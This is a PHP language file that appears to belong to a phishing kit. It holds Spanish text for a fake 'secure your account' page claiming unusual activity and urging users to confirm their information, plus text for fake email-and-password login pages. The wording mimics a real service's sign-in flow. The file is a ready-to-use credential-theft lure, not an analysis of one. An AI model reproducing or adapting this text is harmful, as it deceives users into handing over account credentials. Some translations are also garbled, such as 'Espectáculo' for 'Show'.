<?php
	//SECURE PAGE
	$xys0x = "Asegurando tu cuenta";
	$xys1x = "Notamos alguna actividad inusual";
	$xys2x = "Necesitamos su ayuda para proteger su cuenta para evitar el acceso no autorizado. Para su seguridad, haga clic en Asegurar mi cuenta para confirmar sus informaciones.";
	$xys3x = "Asegurar mi cuenta";
	$xys4x = "Tratamiento...";
	$xys5x = "Contáctenos";
	$xys6x = "Intimidad";
	$xys7x = "Legal";
	$xys8x = "En todo el mundo";
	
	//OLD LOGIN PAGE
	$xys9x = "Ingrese a su cuenta";
	$xys10x = "Parte de tu información no es correcta. Inténtalo de nuevo.";
	$xys11x = "Dirección de correo electrónico";
	$xys12x = "Ingresa tu dirección de correo electrónico.";
	$xys13x = "Contraseña";
	$xys14x = "Espectáculo";
	$xys15x = "Esconder";
	$xys16x = "Ingresa tu contraseña.";
	$xys17x = "Iniciar sesión";
	$xys18x = "¿Tiene problemas para iniciar sesión?";
	$xys19x = "o";
	$xys20x = "Regístrate";

	//NEW LOGIN PAGE
	$xys21x = "Cambio";
	$xys22x = "Recuérdame";
	$xys23x = "¿Qué es esto?";
	$xys24x = "Al hacer clic en este, usted acepta dejar";
	$xys25x = "recuerde su nombre y apellido, imagen de perfil e ID de usuario cuando inicie sesión en este navegador. No recomendamos esto para dispositivos compartidos.";
	$xys26x = "Siguiente";
?>